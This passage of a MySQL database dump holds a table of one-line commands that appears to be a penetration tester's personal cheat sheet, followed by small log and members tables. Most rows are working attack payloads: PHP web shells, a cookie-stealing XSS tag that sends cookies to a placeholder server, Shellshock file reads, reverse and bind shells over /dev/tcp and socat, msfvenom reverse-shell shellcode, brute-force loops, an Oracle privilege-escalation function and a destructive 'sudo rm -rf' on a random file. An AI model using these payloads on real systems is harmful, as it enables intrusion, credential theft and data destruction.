remote system\n','samrdump.py -hashes [LMHASH:NTHASH] [user]:[pass]@[victim] '),(1166,'2017-06-24 17:34:09',' Login using rlogin : Not installed by default\n','rlogin -l [user] [target] '),(1167,'2017-06-24 17:34:09',' Show remote users using finger : Not installed by default? : use 0@[ip] for Solaris bug\n','finger @[ip] '),(1168,'2017-06-24 17:34:10',' Fingerprint remote oracle server\n','tnscmd10g version -h [victim] '),(1169,'2017-06-24 17:34:10',' Get Current user oracle DB : CMD new lines removed\n','CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid curren_user is pragma autonomous_transaction; begin execute immediate \'grant dba to user1 identified by pass1\'; commit; return \'FOO\'; end; '),(1170,'2017-06-24 17:34:10',' Try to brute the remote group name : cisco\n','./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1 '),(1171,'2017-06-24 17:34:10',' Remove trailing whitespace\n','sed -i \'s/[[:space:]]*$//\' [input] '),(1172,'2017-06-24 17:34:11',' Brute force PPTP password\n','thc-pptp-bruter -u [username] -W -w /usr/share/wordlists/nmap.lst '),(1173,'2017-06-24 17:34:11',' NCC Shellshock tool\n','./shocker.py -H TARGET  --command \"/bin/cat /etc/passwd\" -c /cgi-bin/status --verbose '),(1174,'2017-06-24 17:34:16',' Shellshock Read File : Replace echo with anything you want\n','echo -e \"HEAD /cgi-bin/status HTTP/1.1\\r\\nUser-Agent: () { :;}; echo \\$(</etc/passwd)\\r\\nHost: vulnerable\\r\\nConnection: close\\r\\n\\r\\n\" | nc TARGET 80 '),(1175,'2017-06-24 17:34:16',' PHP simple server\n','php -S 0.0.0.0:80 '),(1176,'2017-06-24 17:34:17',' Simple SUID program\n','int main(void){setresuid(0, 0, 0);system(\"/bin/bash\");} '),(1177,'2017-06-24 17:34:17',' perl spawn bash\n','perl -e \'exec \"/bin/bash\";\' '),(1178,'2017-06-24 17:34:17',' python spawn bash\n','python -c \'import pty;pty.spawn(\"/bin/bash\")\' '),(1179,'2017-06-24 17:34:17',' Call a shell from a number of programs, VIM, Nmap FTP SFTP etc\n','!bash '),(1180,'2017-06-24 17:34:17',' Check for accounts that don\'t have password expiry set\n','Get-ADUser -Filter \'useraccountcontrol -band 65536\' -Properties useraccountcontrol | export-csv U-DONT_EXPIRE_PASSWORD.csv '),(1181,'2017-06-24 17:34:18',' Check for accounts that have no password requirement\n','Get-ADUser -Filter \'useraccountcontrol -band 32\' -Properties useraccountcontrol | export-csv U-PASSWD_NOTREQD.csv '),(1182,'2017-06-24 17:34:18',' Accounts that have the password stored in a reversibly encrypted format\n','Get-ADUser -Filter \'useraccountcontrol -band 128\' -Properties useraccountcontrol | export-csv U-ENCRYPTED_TEXT_PWD_ALLOWED.csv '),(1183,'2017-06-24 17:34:18',' List users that are trusted for Kerberos delegation\n','Get-ADUser -Filter \'useraccountcontrol -band 524288\' -Properties useraccountcontrol | export-csv U-TRUSTED_FOR_DELEGATION.csv '),(1184,'2017-06-24 17:34:18',' List accounts that don\'t require pre-authentication\n','Get-ADUser -Filter \'useraccountcontrol -band 4194304\' -Properties useraccountcontrol | export-csv U-DONT_REQUIRE_PREAUTH.csv '),(1185,'2017-06-24 17:34:18',' List accounts that have credentials encrypted with DES\n','Get-ADUser -Filter \'useraccountcontrol -band 2097152\' -Properties useraccountcontrol | export-csv U-USE_DES_KEY_ONLY.csv '),(1186,'2017-06-24 17:34:18',' Dump Ldap structure\n','ldapsearch -x -LLL -E pr=200/noprompt -h [victim] -D \"[domain]\\\\[user]\" -w \'[password]\' -b \"dc=[fqdn],dc=co,dc=uk\" '),(1187,'2017-06-24 17:34:19',' brute force RDP\n','ncrack -u administrator -P 500-worst-passwords.txt -p 3389 10.212.50.21 '),(1188,'2017-06-24 17:34:24',' run a java web start JNLP\n','/opt/jre1.8.0_91/bin/javaws [something].jnlp '),(1189,'2017-06-24 17:34:24',' Open java control pannel\n','/opt/jre1.8.0_91/bin/jcontrol '),(1190,'2017-06-24 17:34:24',' brute force HTTP basic burp\n','Custom iterator -> 1 + Seperator for 1 ->  2 -> payload processing b64 '),(1191,'2017-06-24 17:34:24',' NTLM brute force, if msf is broke : assumes fail is in Index, curl is still bugged?\n','for i in `cat [users]`; do for j in `cat [passwords]`; do wget -c --http-user=\'[domain]\\$i\' --http-password=$j https://[url] --no-check-certificate -e use_proxy=yes -e https_proxy=127.0.0.1:8080 2>index.html; grep -i fail index.html; rm index.html; echo $i:$j; echo \"___\" ; done; done | tee ntlm_brute '),(1192,'2017-06-24 17:34:30',' YsoSerial code execution\n','java -jar ysoserial-0.0.2-all.jar CommonsCollections1 \'[command]\' > payload.out '),(1193,'2017-06-24 17:34:31',' Very Basic SQLI test in wp plugin\n','grep -ir wpdb . | egrep -i \"get_r|insert|escape|query\" | egrep \"_GET|_POST|_REQUEST|\\$\" | grep --color wpdb. '),(1194,'2017-06-24 17:34:31',' Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily\n','<?php if (isset($_GET[\'Password\'])){exec($_GET[\'cmd\']);} ?> '),(1195,'2017-06-24 17:34:31',' Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily\n','<?php if (isset($_GET[\'Password\'])){system($_GET[\'cmd\']);} ?> '),(1196,'2017-06-24 17:34:31',' Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily\n','<?php if (isset($_GET[\'Password\'])){eval($_GET[\'cmd\']);} ?> '),(1197,'2017-06-24 17:34:32',' Php Simple shell, set Password to access, bis your command: See Commix to use this easily\n','<?php if (isset($_GET[\'Password\'])){shell_exec($_GET[\'cmd\']);} ?> '),(1198,'2017-06-24 17:34:32',' EICAR Test string\n','X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H* '),(1199,'2017-06-24 17:34:32',' Hadoop Command execution, of course replace the shell with whatever you want\n','./bin/hadoop jar share/hadoop/tools/lib/hadoop-streaming-2.7.3.jar -input /tmp/out/1 -output /tmp/out/NC_1 -mapper \"bash -i >& /dev/tcp/[ip]/[port] 0>&1\" -reducer NONE -cmdenv user.name=hdfs -cmdenv as=hdfs -verbose -mapdebug \"bash -i >& /dev/tcp/[ip]/[port] 0>&1\" '),(1200,'2017-06-24 17:34:32',' GitUp : Update all the opt gits\n','for i in $(ls -alh /data/shares/opt/ | grep \"^drw\" | awk \'{print $9}\'); do cd /data/shares/opt/$i; git pull; echo $i;done | grep -v fatal '),(1201,'2017-06-24 17:34:32',' TCP ping : Check MTU\n','hping -S -y -m 1300 -p 445 shared '),(1202,'2017-06-24 17:34:32',' ICMP : Check MTU\n','ping 8.8.8.8 -M do -s 1476 -f '),(1203,'2017-06-24 17:34:32',' JSFiddle skele\n','https://jsfiddle.net/byf89m43/2/ '),(1204,'2017-06-24 17:34:32',' Check for UNauth access to bucket\n','aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2 '),(1205,'2017-06-24 17:34:32',' XfreeRDP new swtich format\n','xfreerdp +clipboard /drive:[sharename],[path] /u:[user] /d:[domain] /p:[password ] /size:80% /v:[host] '),(1206,'2017-06-24 17:34:33',' Simple steal cookie\n','<img src=127.0.0.1 onerror=this.src=\'http://[server]/?cookie=\'+document.cookie> '),(1207,'2017-06-24 17:34:33',' Create a SSH based TAP VPN\n','ssh username@server -w any:any & ip addr add 100.64.1.2/32 peer 100.64.1.1 dev ; ssh root@[ip] -C \'ip addr add 100.64.1.1/32 peer 100.64.1.2 dev tun0; route add -net [destnet]/16 gw 1.1.1.1; '),(1208,'2017-06-24 17:34:33',' Hans ICMP tunnel, first cmd is server, second client\n','./hans -v -f -s 100.64.1.1 -p [password]; ./hans -f -c [ip] -p [password] -v '),(1209,'2017-06-24 17:34:33',' ICMP tunnel, first cmd is server, second client\n','iodined -f -c -P [password] 100.164.1.1 [serveraddr]; iodine -f -P [password] [serveraddr] -r '),(1210,'2017-06-24 17:34:33',' DNS tunnel, , first cmd is server, second client\n','ruby ./dnscat2.rb tunneldomain.com; ./dnscat2 tunneldomain.com '),(1211,'2017-06-24 17:34:33',' NTLM aware proxy client, proxychains\n','echo \"Username [user]\" >> config; echo \"Password [pass]\" >> config; echo \"Domain [domain]\" >> config; echo \"Proxy [proxyIP]\" >> config; echo \"Tunnel [lport]:[lip]:[rport]\" >> config; cntlm.exe -c config.conf '),(1212,'2017-06-24 17:34:33',' Run program over socks proxy\n','echo \"[ProxyList]\" > /etc/proxychains.conf; echo \"socks4  127.0.0.1 2222\" >> /etc/proxychains.conf; proxychains [program] '),(1213,'2017-06-24 17:34:33',' Socat BindShell, First on server, second on client\n','socat TCP-LISTEN:[lip],reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane; socat FILE:`tty`,raw,echo=0 TCP:[rip]:[rport] '),(1214,'2017-06-24 17:34:38',' Socat reverse shell, First on client, second on server\n','socat TCP-LISTEN:[lip],reuseaddr FILE:`tty`,raw,echo=0; socat TCP4:[rip]:[rport] EXEC:bash,pty,stderr,setsid,sigint,sane '),(1215,'2017-06-24 17:34:38',' enumerate users and groups\n','getent passwd; getent group; '),(1216,'2017-06-24 17:34:38',' Commix abuse exec as per the php shells, nicer than burp repeater!\n','/opt/commix/commix.py -u \"https://[rip]:443/[resource]?[password]&cmd=1*\" --force-ssl '),(1217,'2017-06-24 17:34:38',' OpenSSL Encypt, add -a if input is b64,\n','openssl aes-256-cbc -in some_file.enc -out some_file.unenc -e -pass pass:somepassword '),(1218,'2017-06-24 17:34:39',' OpenSSL decrypt, add -a if input is b64,\n','openssl aes-256-cbc -in some_file.enc -out some_file.unenc -d -pass pass:somepassword '),(1219,'2017-06-24 17:34:39',' Decrypt group policy preferences password aka Cpassword, use LAPS not GPP\n','/usr/bin/gpp-decrypt [cpassword] '),(1220,'2017-06-24 17:34:39',' Pick a file at random . . .\n','sudo rm -rf $(sudo find / -type f | shuf -n1) '),(1221,'2017-06-24 17:34:39',' List logged in users on the remote host, usefull before triggering AV or wanting to RDP in\n','psexec.py \'[user]\':[pass]]@[ip] \"query user\"  -- '),(1222,'2017-06-24 17:34:39',' Most used Terminal commands\n','history | awk \'{a[$2]++}END{for(i in a){print a[i] \" \" i}}\' | sort -rn | head '),(1223,'2017-06-24 17:34:44',' Grab Succsessfull passwords from a tee\'d medusa, bah to spaces in usernames\n','cat [file]  | grep \"ACCOUNT FOUND\" | grep -v 0x000072:STATUS_ACCOUNT_DISABLED | awk  -F User: \'{print $2}\' | awk -F : \'{print $1, $2}\' | awk -F \\\\[SUC \'{print $1}\' | awk -F \" Password  \" \'{print $1\":\"$2}\' | sort | sed s/\' \'/\'\'/| uniq '),(1224,'2017-06-24 17:34:45',' Take the active users output and create filled in CMD\'s, course it can be anything, not just TSQL\n','for i in `cat ../clean_creds`; do echo $i | awk -F : \'{print \"tsql -S [IP] -p 1433 -U [domain]\\\\\\\\\"$2\" -P \"$3}\'; done '),(1225,'2017-06-24 17:34:50',' Project your mic to remote hosts speakers\n','dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp '),(1226,'2017-06-24 17:34:50',' Equivlent of Yum whatprovides : What provides what file\n','apt-file update; apt-file search [xfreerdp] '),(1227,'2017-06-24 17:34:50',' Equivlent of apt-file search : What provides what file\n','yum whatproivdes '),(1228,'2017-06-24 17:34:50',' Crack a ZIP file with a wordlist\n','fcrackzip -D -p \'x\' -u test.zip '),(1229,'2017-06-24 17:34:50',' Crack a zip, brute force a 4 char password\n','fcrackzip -D -p \'x\' -u test.zip '),(1230,'2017-06-24 17:34:50',' Repeat A x times pipe into where you think the overflow location is, look for 0x41\'s\n','perl -e \'print \"A\"x10000; print \"\\n\"\' '),(1231,'2017-06-24 17:34:50',' create a patern of 2700 bytes to isolate the buffer size you have, part of msf, look for value of EIP\n','pattern_create.rb -l 2700 '),(1232,'2017-06-24 17:34:50',' Get the exact offset for the EIP\n','pattern_offset.rb -l 2700 -q [EIP] '),(1233,'2017-06-24 17:34:50',' Bad Char\'s block, re-send removing bad ones\n','\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\" '),(1234,'2017-06-24 17:34:51',' Work out if there are any juicy targets to look for a jmp esp in (imunity debuger)\n','!mona modules '),(1235,'2017-06-24 17:34:56',' Look for a JMP ESP in the DLL found in the mona modules\n','!mona find \'\\xff\\xef\' -m [dll] '),(1236,'2017-06-24 17:34:56',' Create shellcode which connects back on port can add –e x86/shikata_ga_nai, -b is bad chars\n','msfvenom -p windows/shell_reverse_tcp LHOST=[LIP] LPORT=[LPORT] -f c -b \"\\x00\" '),(1237,'2017-06-24 17:35:02',' Anoy a co-worker by rotating their screen\n','xrandr   --output `xrandr -q | grep \"connected\" | grep -v dis | awk \'{print $1}\' | head -n 1` --rotate  inverted '),(1238,'2017-06-24 17:35:02',' Locate SUID files owned by root\n','find / \\( -type f -a -user root -a -perm -4001 \\) '),(1239,'2017-06-24 17:35:02',' Quick formatted link to check ketne exploits\n','echo \"https://www.kernel-exploits.com/kernel/?version=\"`uname -r  | awk -F . \'{print $1\".\"$2}\'` '),(1240,'2017-06-24 17:35:02',' Asp.net filter evasion\n','<% style=behavior:url(: onreadystatechange=alert(1)> '),(1241,'2017-06-24 17:35:02',' Crack a zip file, Note: Older enc only\n','patator.py unzip_pass zipfile=[file] password=FILE0 0=[pass.txt] -x ignore:code!=0 '),(1242,'2017-06-24 17:35:02',' Show updates available to a MacOS device\n','softwareupdate -l '),(1243,'2017-06-24 17:35:02',' Show a compact ascii table\n','man -P \'less -p \".*Tables\"\' ascii '),(1244,'2017-06-24 17:35:02',' Do a quick nmap of the top 1000 UDP, all TCP, and common HTTP ports\n','nmap -sU --top-ports 1000 -oA clientname_udp -iL scope -v --open & nmap -A -oA clientname_ce -p- -iL scope -v --open & nmap -A -oA clientname_ce_quick --script /usr/share/nmap/scripts/http-screenshot.nse -p 80,443,21,22,23,25,109,110,990,465,1194,1723,8080,8081,8443,8843,8000,9000,9090,9081,9091,8194,9103,9102,8192 -iL scope -v --open; '),(1245,'2017-06-24 17:35:02',' Echo hello world, test for RCE in JSP application.\n','<%=\"Hello Word\"%> '),(1246,'2017-06-24 17:35:02',' Echo hello world, test for RCE in JSP application.\n','out.print(\"Hello World\"); '),(1247,'2017-06-24 17:35:02',' Echo hello world, test for RCE in JSP application.\n','<c:out value=\"${[variableName]}\" /> '),(1248,'2017-06-24 17:35:03',' Convert exfil ICMP back to files from pcap\n','for line in $(tshark -r [pcap] -T fields -e data  | uniq | grep -v \"......................................................\" | sed s/.*11/11/g | grep \"11.*99\"  | sed s/11// | sed s/99$// | tr -d \'\\n\' | sed s/0101010101010101010101010101/\'\\n\'/g |sed s/010101010101010101010101010//g); do echo $line | xxd -r  -p | base64 -d;echo +++++++++++++++++++; done ');
/*!40000 ALTER TABLE `knx` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `log`
--

DROP TABLE IF EXISTS `log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `time` varchar(30) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=14 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `log`
--

LOCK TABLES `log` WRITE;
/*!40000 ALTER TABLE `log` DISABLE KEYS */;
INSERT INTO `log` VALUES (12,3,'1497433903'),(13,3,'1497443733');
/*!40000 ALTER TABLE `log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `members`
--

DROP TABLE IF EXISTS `members`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `members` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(30) NOT NULL,
  `password` char(128) NOT NULL,
  `salt` char(128) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `members`
--

LOCK TABLES `members` WRITE;
/*!40000 ALTER TABLE `members` DISABLE KEYS */;
INSERT INTO `members` VALUES (1,'knx','','');
/*!40000 ALTER TABLE `members` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2017-06-25  0:00:01
